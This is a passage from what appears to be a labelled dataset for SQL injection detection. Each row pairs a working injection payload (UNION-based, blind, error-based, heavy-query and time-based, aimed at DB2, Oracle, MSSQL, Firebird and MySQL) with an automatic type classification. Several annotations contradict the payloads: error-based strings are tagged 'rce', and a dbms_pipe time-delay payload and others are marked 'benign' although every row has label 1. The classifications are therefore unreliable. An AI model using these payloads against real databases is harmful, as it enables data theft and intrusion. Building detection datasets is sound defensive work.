row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4574,"1%"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
4575,"1' in boolean mode ) union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4576,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""cgpm"" like ""cgpm",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4577,"1"" where 5250 = 5250",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4578,"1' ) ) as umah where 3781 = 3781 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4579,( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master..sysdatabases ) end ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4580,"-9315' ) ) ) union all select 5057,5057,5057,5057,5057#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4581,"-2962' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'hkjo' = 'hkjo",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
4582,1 ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 2197 = 2197,1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
4583,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4584,1' where 3337 = 3337 and 8403 = 5760,1,,boolean_blind,generic,0.95,3337 = 3337 and detected — boolean_blind injection (priority 8) on generic,rule-based
4585,"1"" or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4586,"1 ) ) as faxr where 7972 = 7972 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
4587,"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vurb"" like ""vurb",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
4588,1 ) where 8094 = 8094,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4589,"1%' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
